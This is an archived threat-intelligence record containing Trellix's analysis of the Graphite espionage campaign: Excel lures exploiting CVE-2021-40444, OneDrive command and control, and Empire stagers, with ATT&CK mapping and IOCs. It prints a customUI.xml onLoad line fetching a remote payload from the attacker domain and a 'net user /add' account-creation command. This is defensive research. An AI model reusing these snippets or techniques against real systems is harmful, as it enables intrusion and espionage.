{
    "id": "28325466-651c-474d-a12f-00426d65e472",
    "created_at": "2022-10-25T16:48:16.508899Z",
    "updated_at": "2025-03-27T02:15:24.939814Z",
    "deleted_at": null,
    "sha1_hash": "08fff1030cceb4ca9a10bf788cf477017a5bae9c",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-01-26T07:46:48Z",
    "file_modification_date": "2022-01-26T07:46:48Z",
    "file_size": 1888702,
    "plain_text": "# Prime Minister’s Office Compromised: Details of Recent Espionage Campaign\n\n**[trellix.com/en-us/about/newsroom/stories/threat-labs/prime-ministers-office-compromised.html](https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/prime-ministers-office-compromised.html)**\n\n[By Marc Elias · January 25, 2022](https://www.trellix.com/en-us/about/newsroom/stories/contributors/marc-elias.html)\n\n[A special thanks to Christiaan Beek, Alexandre Mundo, Leandro Velasco and Max Kersten](https://www.trellix.com/en-us/about/newsroom/stories/contributors/christiaan-beek.html)\nfor malware analysis and support during this investigation.\n\n**Executive Summary**\n\nOur Advanced Threat Research Team have identified a multi-stage espionage campaign\ntargeting high-ranking government officials overseeing national security policy and\nindividuals in the defense industry in Western Asia. As we detail the technical\ncomponents of this attack, we can confirm that we have undertaken pre-release disclosure\nto the victims and provided all necessary content required to remove all known attack\ncomponents from their environments.\n\nThe infection chain starts with the execution of an Excel downloader, most likely sent to\nthe victim via email, which exploits an MSHTML remote code execution vulnerability\n[(CVE-2021-40444) to execute a malicious executable in memory. The attack uses a](https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-defender-blog-mshtml-cve-2021-40444/)\nfollow-up piece of malware called Graphite because it uses Microsoft’s Graph API to\nleverage OneDrive as a command and control server—a technique our team has not seen\nbefore. Furthermore, the attack was split into multiple stages to stay as hidden as\npossible.\n\nCommand and control functions used an Empire server that was prepared in July 2021,\nand the actual campaign was active from October to November 2021. The below blog will\nexplain the inner workings, victimology, infrastructure and timeline of the attack and, of\ncourse, reveal the IOCs and MITRE ATT&CK techniques.\n\nA number of the attack indicators and apparent geopolitical objectives resemble those\nassociated with the previously uncovered threat actor APT28. While we don’t believe in\nattributing any campaign solely based on such evidence, we have a moderate level of\nconfidence that our assumption is accurate. That said, we are supremely confident that\nwe are dealing with a very skilled actor based on how infrastructure, malware coding and\noperation were setup.\n\nTrellix customers are protected by the different McAfee Enterprise and FireEye products\nthat were provided with these indicators.\n\n**Analysis of the Attack Process**\n\n\n-----\n\nThis section provides an analysis of the overall process of the attack, beginning with the\nexecution of an Excel file containing an exploit for the MSHTML remote code execution\n[vulnerability (CVE-2021-40444) vulnerability. This is used to execute a malicious DLL](https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-defender-blog-mshtml-cve-2021-40444/)\nfile acting as a downloader for the third stage malware we called Graphite. Graphite is a\nnewly discovered malware sample based on a OneDrive Empire Stager which leverages\nOneDrive accounts as a command and control server via the Microsoft Graph API.\n\nThe last phases of this multi-stage attack, which we believe is associated with an APT\noperation, includes the execution of different Empire stagers to finally download an\nEmpire agent on victims’ computers and engage the command and control server to\nremotely control the systems.\n\nThe following diagram shows the overall process of this attack.\n\n**Figure 1. Attack flow**\nFirst Stage – Excel Downloaders\n\nAs suggested, the first stage of the attack likely uses a spear phishing email to lure victims\ninto opening an Excel file, which goes by the name “parliament_rew.xlsx”. Below you can\nsee the identifying information for this file:\n\nFile type Excel Microsoft Office Open XML Format document\n\nFile name parliament_rew.xlsx\n\nFile size 19.26 KB\n\n\nCompilation\ntime\n\n\n05/10/2021\n\n\nMD5 8e2f8c95b1919651fcac7293cb704c1c\n\nSHA-256 f007020c74daa0645b181b7b604181613b68d195bd585afd71c3cd5160fb8fc4\n\n\n-----\n\n**Figure 2. Decoy text observed in the Excel file**\nIn analyzing this file’s structure, we observed that it includes a folder named “customUI”\nthat contains a file named “customUI.xml”. Opening this file with a text editor, we\nobserved that the malicious document uses the “CustomUI.OnLoad” property of the\nOpenXML format to load an external file from a remote server:\n\n<customUI xmlns=\"http://schemas.microsoft.com/office/2006/01/customui\"\nonLoad='https://wordkeyvpload[.]net/keys/parliament_rew.xls!123'> </customUI>\n\nThis technique allows the attackers to bypass some antivirus scanning engines and office\nanalysis tools, decreasing the chances of the documents being detected.\n\nThe downloaded file is again an Excel spreadsheet, but this time it is saved using the old\nMicrosoft Office Excel 97-2003 Binary File Format (.xls). Below you can see the\nidentifying information of the file:\n\nFile type Microsoft Office Excel 97-2003 Binary File Format\n\nFile name parliament_rew.xls\n\nFile size 20.00 KB\n\n\nCompilation\ntime\n\n\n05/10/2021\n\n\nMD5 abd182f7f7b36e9a1ea9ac210d1899df\n\nSHA-256 7bd11553409d635fe8ad72c5d1c56f77b6be55f1ace4f77f42f6bfb4408f4b3a\n\nAnalyzing the metadata objects, we can identify that the creator was using the codepage\n1252 used in Western European countries and the file was created on October 5th, 2021.\n\n\n-----\n\n**Figure 3. Document metadata**\nLater, we analyzed the OLE objects in the document and discovered a Linked Object\nOLEStream Structure which contains a link to the exploit of the CVE-2021-40444\nvulnerability hosted in the attackers’ server. This allows the document to automatically\ndownload the HTML file and subsequently call the Internet Explorer engine to interpret\nit, triggering the execution of the exploit.\n\n**Figure 4. Remote link in OLE object**\nIn this blog post we won’t examine the internals of the CVE-2021-40444 vulnerability as\nit has already been publicly explained and discussed. Instead, we will continue the\nanalysis on the second stage DLL contained in the CAB file of the exploit.\n\n**Second Stage – DLL Downloader**\n\nThe second stage is a DLL executable named fontsubc.dll which was extracted from the\nCAB file used in the exploit mentioned before. You can see the identifying information of\nthe file below:\n\nFile type PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit\n\nFile name fontsubc.dll\n\nFile size 88.50 KB\n\n\nCompilation\ntime\n\n\n28/09/2021\n\n\nMD5 81de02d6e6fca8e16f2914ebd2176b78\n\nSHA-256 1ee602e9b6e4e58dfff0fb8606a41336723169f8d6b4b1b433372bf6573baf40\n\n\n-----\n\nThis file exports a function called “CPlApplet” that Windows recognizes as a control panel\napplication. Primarily, this acts a downloader for the next stage malware which is located\nat hxxps://wordkeyvpload[.]net/keys/update[.]dat using COM Objects and the API\n“URLOpenBlockingStreamW”.\n\n**Figure 5. Download of next stage malware**\nAfter downloading the file, the malware will decrypt it with an embedded RSA Public Key\nand check its integrity calculating a SHA-256 of the decrypted payload. Lastly, the\nmalware will allocate virtual memory, copy the payload to it and execute it.\n\n\n-----\n\n**Figure 6. Payload decryption and execution**\nBefore executing the downloaded payload, the malware will compare the first four bytes\nwith the magic value DE 47 AC 45 in hexadecimal; if they are different, it won’t execute\nthe payload.\n\n**Figure 7. Malware magic value**\n\n**Third Stage – Graphite Malware**\n\nThe third stage is a DLL executable, never written to disk, named dfsvc.dll that we were\nable to extract from the memory of the previous stage. Below you can see the identifying\ninformation of the file:\n\nFile type PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit\n\nFile name dfsvc.dll\n\nFile size 24.00 KB\n\n\nCompilation\ntime\n\n\n20/09/2021\n\n\n-----\n\nMD5 0ff09c344fc672880fdb03d429c7bda4\n\nSHA-256 f229a8eb6f5285a1762677c38175c71dead77768f6f5a6ebc320679068293231\n\nWe named this malware Graphite due to the use of the Microsoft Graph API to use\nOneDrive as command and control. It is very likely that the developers of Graphite used\nthe Empire OneDrive Stager as a reference due to the similarities of the functionality and\nthe file structure used in the OneDrive account of the actors.\n\n**Figure 8. Empire OneDrive stager API requests**\nGraphite starts by creating a mutex with the hardcoded name\n“250gHJAWUI289382s3h3Uasuh289di” to avoid double executions, decrypt the strings\nand resolve dynamically the APIs it will use later. Moreover, it will calculate a bot\nidentifier to identify the infected computer which is a CRC32 checksum of the value\nstored in the registry key “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\\nCryptography\\MachineGuid”.\n\n**Figure 9. Graphite initializations**\nNext, the malware will create a thread to monitor the execution of tasks and upload its\nresults to the OneDrive account. Result files will be uploaded to the “update” folder of the\nattackers’ OneDrive account.\n\n\n-----\n\n**Figure 10. Thread to monitor task results**\nAfter that, the malware will enter into an infinite loop where every 20 minutes it will\nobtain a new OAuth2 token to use with the Microsoft Graph API requests and determine\nif there are new tasks to execute in the “check” folder of the attackers’ OneDrive account.\n\n**Figure 11. Request of new OAuth2 token**\nOnce it obtained a valid OAuth2 token, reconnaissance data is gathered containing the\nfollowing information from the victims’ systems:\n\nRunning processes\n.NET CLR version from PowerShell\nWindows OS version\n\n\n-----\n\nThe data is compressed using the LZNT1 algorithm and encrypted with a hardcoded AES256-CBC key with a random IV. The operator tasks are encoded in the same way. Finally,\nthe file containing the system information is uploaded to the folder “{BOT_ID}/update”\nin OneDrive with a random name.\n\n**Figure 12. Graphite encoding data**\nGraphite will also query for new commands by enumerating the child files in the \"check\"\nsubdirectory. If a new file is found, it will use the Graph API to download the content of\nthe file and decrypt it. The decrypted tasks have two fields; the first one is a unique\nidentifier of the task and the second one specifies the command to execute.\n\nThe command value “1” will instruct the malware to send the system information to the\ncommand and control again, which is the attackers’ OneDrive. The command value “2”\nindicates that the decrypted task is a shellcode, and the malware will create a thread to\nexecute it.\n\n\n-----\n\n**Figure 13. Graphite commands**\nIf the received task is a shellcode, it will check the third field with the magic value DE 47\nAC 45 in hexadecimal and, if they are different, it won’t execute the payload. The rest of\nthe bytes of the task is the shellcode that will be executed. Lastly, the task files are deleted\nfrom the OneDrive after being processed.\n\n**Figure 14. Decrypted operator task**\nThe diagram below summarizes the flow of the Graphite malware.\n\n\n-----\n\n**Figure 15. Graphite execution diagram**\n\n**Fourth Stage – Empire DLL Launcher Stager**\n\nThe fourth stage is a dynamic library file named csiresources.dll that we were able to\nextract from a task from the previous stage. The file was embedded into a Graphite\nshellcode task used to reflectively load the executable into the memory of the process and\nexecute it. Below you can see the identifying information of the file:\n\nFile type PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit\n\nFile name csiresources.dll\n\nFile size 111.00 KB\n\n\nCompilation\ntime\n\n\n21/09/2021\n\n\nMD5 138122869fb47e3c1a0dfe66d4736f9b\n\nSHA-256 25765faedcfee59ce3f5eb3540d70f99f124af4942f24f0666c1374b01b24bd9\n\n\n-----\n\nThe sample is a generated Empire DLL Launcher stager that will initialize and start the\n.NET CLR Runtime into an unmanaged process to execute a download-cradle to stage an\nEmpire agent. With that, it is possible to run the Empire agent in a process that’s not\nPowerShell.exe.\n\nFirst, the malware will check if the malware is executing from the explorer.exe process. If\nit is not, the malware will exit.\n\n**Figure 16. Process name check**\nNext, the malware will try to find the file “EhStorShell.dll” in the System32 folder and\nload it. With this, the malware makes sure that the original “EhStorShell.dll” file is loaded\ninto the explorer.exe context.\n\n**Figure 17. Loading EhStorShell.dll library**\nThe previous operation is important because the follow-up malware will override the\nCLSID “{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}” to gain persistence in the\nvictims’ system, performing a COM Hijacking technique. The aforementioned CLSID\ncorresponds to the “Enhanced Storage Shell Extension DLL” and is handled by the file\n“EhStorShell.dll”.\n\nComing up next, the malware will load, initialize and start the .NET CLR Runtime, XOR\ndecrypt the .NET next stage payload and load it into memory. Lastly, it will execute the\nfile using the .NET Runtime.\n\n**Figure 18. Decryption of next stage malware**\n\n\n-----\n\n**Fifth Stage – Empire PowerShell C# Stager**\n\nThe fifth stage is a .NET executable named Service.exe which was embedded and\nencrypted in the previous stage. Below you can see the identifying information of the file:\n\n\nFile\ntype\n\nFile\nsize\n\n\nPE32 executable for MS Windows (console) Intel 80386 32-bit\n\n34.00 KB\n\n\nMD5 3b27fe7b346e3dabd08e618c9674e007\n\n\nSHA256\n\n\nd5c81423a856e68ad5edaf410c5dfed783a0ea4770dbc8fb4943406c316a4317\n\n\nThis sample is an Empire PowerShell C# Stager whose main goal is to create an instance\nof a PowerShell object, decrypt the embedded PowerShell script using XOR operations\nand decode it with Base64 before finally executing the payload with the Invoke function.\n\n**Figure 19. Fifth stage code**\nThe reason behind using a .NET executable to load and execute PowerShell code is to\nbypass security measures like AMSI, allowing execution from a process that shouldn’t\nallow it.\n\n**Sixth Stage – Empire HTTP PowerShell Stager**\n\nThe last stage is a PowerShell script, specifically an Empire HTTP Stager, which was\nembedded and encrypted in the previous stage. Below you can see the identifying\ninformation of the file:\n\nFile type Powershell script\n\nFile size 6.00 KB\n\nMD5 a81fab5cf0c2a1c66e50184c38283e0e\n\n\n-----\n\nSHA256\n\n\nda5a03bd74a271e4c5ef75ccdd065afe9bd1af749dbcff36ec7ce58bf7a7db37\n\n\nAs we mentioned earlier, this is the last stage of the multi-stage attack and is an HTTP\nstager highly obfuscated using the Invoke-Obfuscation script from Empire to make\nanalysis difficult.\n\n**Figure 20. Obfuscated PowerShell script**\nThe main functionality of the script is to contact hxxp://wordkeyvpload[.]org/index[.]jsp\nto send the initial information about the system and connect to the URL\nhxxp://wordkeyvpload[.]org/index[.]php to download the encrypted Empire agent,\ndecrypt it with AES-256 and execute it.\n\n**Timeline of Events**\n\nBased on all the activities monitored and analyzed, we provide the following timeline of\nevents:\n\n**Figure 21. Timeline of the campaign**\n\n**Targeting**\n\nOne of the lure documents we mentioned before (named “parliament_rew.xlsx”) might\nhave been aimed for targeting government employees.\n\nBesides targeting government entities, it appears this adversary also has its sights on the\ndefense industry. Another document with the name “Missions Budget.xlsx” contained the\ntext “Military and civilian missions and operations” and the budgets in dollars for the\nmilitary operations in some countries for the years 2022 and 2023.\n\n\n-----\n\n**Figure 22. Lure document targeting the defense sector**\nMoreover, from our telemetry we also have observed that Poland and other Eastern\nEuropean countries were of interest to the actors behind this campaign.\n\nThe complete victimology of the actors is unknown, but the lure documents we have seen\nshow its activities are centered in specific regions and industries. Based on the names, the\ncontent of the malicious Excel files and our telemetry, it seems the actors are targeting\ncountries in Eastern Europe and the most prevalent industries are Defense and\nGovernment.\n\n**Infrastructure**\n\nThanks to the analysis of the full attack chain, two hosts related to the attack were\nidentified. The first domain is wordkeyvpload.net which resolves to the IP 131.153.96.114,\nlocated in Serbia and registered on the 7th of July 2021 with OwnRegistrar Inc.\n\nQuerying the IP with a reverse DNS lookup tool, a PTR record was obtained resolving to\nthe domain “bwh7196.bitcoinwebhosting.net” which could be an indication that the\nserver was bought from the Bitcoin Web Hosting VPS reseller company.\n\n**Figure 23. Reverse DNS query**\nThe main functionality of this command-and-control server is to host the HTML exploit\nfor CVE-2021-40444 and the CAB file containing the second stage DLL.\n\nThe second domain identified is wordkeyvpload.org which resolves to the IP\n185.117.88.19, located in Sweden, and registered on the 18th of June 2021 with\nNamecheap Inc. Based on the operating system (Microsoft Windows Server 2008 R2),\nthe HTTP server (Microsoft-IIS/7.5) and the open ports (1337 and 5000) it is very likely\nthe host is running the latest version of the Empire post-exploitation framework.\n\n\n-----\n\nThe reason behind that hypothesis is that the default configuration of Empire servers uses\nport 1337 to host a RESTful API and port 5000 hosts a SocketIO interface to interact\nremotely with the server. Also, when deploying a HTTP Listener, the default value for the\nHTTP Server field is hardcoded to “Microsoft-IIS/7.5”.\n\n**Figure 24. Local Empire server execution with default configuration**\nWith the aforementioned information, as well as the extraction of the command and\ncontrol from the last stage of the malware, we can confirm that this host acts as an\nEmpire server used to remotely control the agents installed in victims’ machines and send\ncommands to execute them.\n\n**Attribution**\n\nDuring the timeline of this operation there have been some political tensions around the\nArmenian and Azerbaijani border. Therefore, from a classic intelligence operation point\nof view, it would make complete sense to infiltrate and gather information to assess the\nrisk and movements of the different parties involved.\n\nThroughout our research into the Graphite campaign, we extracted all timestamps of\nactivity from the attackers from our telemetry and found two consistent trends. First, the\nactivity days of the adversary are from Monday to Friday, as depicted in the image below:\n\n\n-----\n\n**Figure 25. Adversary’s working days**\nSecond, the activity timestamps correspond to normal business hours (from 08h to 18h)\nin the GMT+3 time zone, which includes Moscow Time, Turkey Time, Arabia Standard\nTime and East Africa Time.\n\n**Figure 26. Adversary’s working hours**\n\n\n-----\n\nAnother interesting discovery during the investigation was that the attackers were using\nthe CLSID (D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D) for persistence, which\nmatched with an ESET report in which researchers mentioned a Russian Operation\ntargeting Eastern European countries.\n\nAnalyzing and comparing code-blocks and sequences from the graphite malware with our\ndatabase of samples, we discovered overlap with samples in 2018 being attributed to\nAPT28. We compared for example our samples towards this one:\n5bb9f53636efafdd30023d44be1be55bf7c7b7d5 (sha1):\n\n**Figure 27 Code comparison of samples**\nWhen we zoom in on some of the functions, we observe on the left side of the below\npicture the graphite sample and on the right the forementioned 2018 sample. With almost\nthree years in time difference, it makes sense that code is changed, but still it looks like\nthe programmer was happy with some of the previous functions:\n\n\n-----\n\n**Figure 28 Similar function flow**\nAlthough we mentioned some tactics, techniques and procedures (TTPs) of the actors\nbehind this campaign, we simply do not have enough context, similarities or overlap to\npoint us with low/moderate confidence towards APT28, let alone a nation-state sponsor.\nHowever, we believe we are dealing with a skilled actor based on how the infrastructure,\nmalware coding and operation was setup.\n\n**Conclusion**\n\nThe analysis of the campaign described in this blog post allowed us to gather insights into\na multi-staged attack performed in early October, leveraging the MSHTML remote code\nexecution vulnerability (CVE-2021-40444) to target countries in Eastern Europe.\n\nAs seen in the analysis of the Graphite malware, one quite innovative functionality is the\nuse of the OneDrive service as a Command and Control through querying the Microsoft\nGraph API with a hardcoded token in the malware. This type of communication allows\nthe malware to go unnoticed in the victims’ systems since it will only connect to legitimate\nMicrosoft domains and won’t show any suspicious network traffic.\n\nThanks to the analysis of the full attack process, we were able to identify new\ninfrastructure acting as command and control from the actors and the final payload,\nwhich is an agent from the post-exploitation framework Empire. All the above allowed us\nto construct a timeline of the activity observed in the campaign.\n\nThe actors behind the attack seem very advanced based on the targeting, the malware and\nthe infrastructure used in the operation, so we presume that the main goal of this\ncampaign is espionage. With a low and moderate confidence, we believe this operation\n\n\n-----\n\nwas executed by APT28. To further investigate, we provided some tactics, techniques and\nprocedures (TTPs), indicators on the infrastructure, targeting and capabilities to detect\nthis campaign.\n\n**MITRE ATT&CK Techniques**\n\nTactic\n\n\nResource\nDevelopment\n\nResource\nDevelopment\n\nResource\nDevelopment\n\n\nT1583.001 Acquire\nInfrastructure:\nDomains\n\nT1587.001 Develop\ncapabilities:\nMalware\n\nT1588.002 Develop\ncapabilities:\nTool\n\n\nwordkeyvpload[.]net\n\nwordkeyvpload[.]org\n\nGraphite malware\n\nEmpire\n\nBMD(2021)0247.xlsx\n\nCVE-2021-40444\n\nEmpire Powershell\nstager\n\n\nInitial Access T1566.001 Phishing:\nSpear phishing\nAttachment\n\nExecution T1203 Exploitation for\nClient\nExecution\n\nExecution T1059.001 Command and\nScripting\nInterpreter:\nPowerShell\n\n\nAttackers\npurchased\ndomains to be\nused as a\ncommand and\ncontrol.\n\nAttackers built\nmalicious\ncomponents to\nconduct their\nattack.\n\nAttackers\nemployed red\nteaming tools to\nconduct their\nattack.\n\nAdversaries sent\nspear phishing\nemails with a\nmalicious\nattachment to\ngain access to\nvictim systems.\n\nAdversaries\nexploited a\nvulnerability in\nMicrosoft Office\nto execute code.\n\nAdversaries\nabused\nPowerShell for\nexecution of the\nEmpire stager.\n\n\n-----\n\nPersistence T1546.015 Event\nTriggered\nExecution:\nComponent\nObject Model\nHijacking\n\nPersistence T1136.001 Create\nAccount: Local\nAccount\n\n\nCLSID: D9144DCDE998-4ECA-AB6ADCD83CCBA16D\n\nnet user /add user1\n\nEmpire DLL\nLauncher stager\n\nUse of different\nEmpire stagers\n\nMicrosoft OneDrive\n\nEmpire Server\n\n\nDefense\nEvasion\n\nCommand\nand Control\n\nCommand\nand Control\n\n\nT1620 Reflective\nCode Loading\n\nT1104 Multi-Stage\nChannels\n\nT1102.002 Web Service:\nBidirectional\nCommunication\n\n\nAdversaries\nestablished\npersistence by\nexecuting\nmalicious content\ntriggered by\nhijacked\nreferences to\nComponent\nObject Model\n(COM) objects.\n\nAdversaries\ncreated a local\naccount to\nmaintain access\nto victim\nsystems.\n\nAdversaries\nreflectively\nloaded code into\na process to\nconceal the\nexecution of\nmalicious\npayloads.\n\nAdversaries\ncreated multiple\nstages to\nobfuscate the\ncommand-andcontrol channel\nand to make\ndetection more\ndifficult.\n\nAdversaries used\nan existing,\nlegitimate\nexternal Web\nservice as a\nmeans for\nsending\ncommands to\nand receiving\noutput from a\ncompromised\nsystem over the\nWeb service\nchannel.\n\n\n-----\n\nCommand\nand Control\n\nCommand\nand Control\n\n\nT1573.001 Encrypted\nChannel:\nSymmetric\nCryptography\n\nT1573.002 Encrypted\nChannel:\nAsymmetric\nCryptography\n\n\nAdversaries\nemployed a\nknown symmetric\nencryption\nalgorithm to\nconceal\ncommand and\ncontrol traffic\nrather than\nrelying on any\ninherent\nprotections\nprovided by a\ncommunication\nprotocol.\n\nAdversaries\nemployed a\nknown\nasymmetric\nencryption\nalgorithm to\nconceal\ncommand and\ncontrol traffic\nrather than\nrelying on any\ninherent\nprotections\nprovided by a\ncommunication\nprotocol.\n\n\nAES 256\n\nRSA\n\n\n**Indicators of Compromise (IOCs)**\n\nFirst stage – Excel Downloaders\n\n40d56f10a54bd8031191638e7df74753315e76f198192b6e3965d182136fc2fa\n\nf007020c74daa0645b181b7b604181613b68d195bd585afd71c3cd5160fb8fc4\n\n7bd11553409d635fe8ad72c5d1c56f77b6be55f1ace4f77f42f6bfb4408f4b3a\n\n9052568af4c2e9935c837c9bdcffc79183862df083b58aae167a480bd3892ad0\n\nSecond stage – Downloader DLL\n\n1ee602e9b6e4e58dfff0fb8606a41336723169f8d6b4b1b433372bf6573baf40\n\nThird stage – Graphite\n\n35f2a4d11264e7729eaf7a7e002de0799d0981057187793c0ba93f636126135f\n\nf229a8eb6f5285a1762677c38175c71dead77768f6f5a6ebc320679068293231\n\nFourth stage – DLL Launcher Stager\n\n25765faedcfee59ce3f5eb3540d70f99f124af4942f24f0666c1374b01b24bd9\n\nFifth stage – PowerShell C# Stager\n\n\n-----\n\nd5c81423a856e68ad5edaf410c5dfed783a0ea4770dbc8fb4943406c316a4317\nSixth stage – Empire HTTP Powershell Stager\n\nda5a03bd74a271e4c5ef75ccdd065afe9bd1af749dbcff36ec7ce58bf7a7db37\n\nURLs\n\nhxxps://wordkeyvpload[.]net/keys/Missions Budget Lb.xls\n\nhxxps://wordkeyvpload[.]net/keys/parliament_rew.xls\n\nhxxps://wordkeyvpload[.]net/keys/Missions Budget.xls\n\nhxxps://wordkeyvpload[.]net/keys/TR_comparison.xls\n\nhxxps://wordkeyvpload[.]net/keys/JjnJq3.html\n\nhxxps://wordkeyvpload[.]net/keys/iz7hfD.html\n\nhxxps://wordkeyvpload[.]net/keys/Ari2Rc.html\n\nhxxps://wordkeyvpload[.]net/keys/OD4cNq.html\n\nhxxps://wordkeyvpload[.]net/keys/0YOL4.cab\n\nhxxps://wordkeyvpload[.]net/keys/whmel.cab\n\nhxxps://wordkeyvpload[.]net/keys/UdOpQ.cab\n\nhxxps://wordkeyvpload[.]net/keys/D9V5E.cab\n\nhxxps://wordkeyvpload[.]net/keys/update.dat\n\nhxxps://wordkeyvpload[.]org/index.jsp\n\nhxxps://wordkeyvpload[.]org/index.php\n\nhxxps://wordkeyvpload[.]org/news.php\n\nhxxps://wordkeyvpload[.]org/admin/get.php\n\nhxxps://wordkeyvpload[.]org/login/process.php\n\nDomains\n\nwordkeyvpload[.]net\n\nwordkeyvpload[.]org\n\njimbeam[.]live\n\nIPs\n\n131.153.96[.]114\n\n185.117.88[.]19\n\n94.140.112[.]178\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2022/2022.01.25.Prime_Minister_Compromised/Prime%20Minister%E2%80%99s%20Office%20Compromised_%20Details%20of%20Recent%20Espionage%20Campaign.pdf"
    ],
    "report_names": [
        "Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041724,
    "ts_creation_date": 1643183208,
    "ts_modification_date": 1643183208,
    "files": {
        "pdf": "https://archive.orkl.eu/08fff1030cceb4ca9a10bf788cf477017a5bae9c.pdf",
        "text": "https://archive.orkl.eu/08fff1030cceb4ca9a10bf788cf477017a5bae9c.txt",
        "img": "https://archive.orkl.eu/08fff1030cceb4ca9a10bf788cf477017a5bae9c.jpg"
    }
}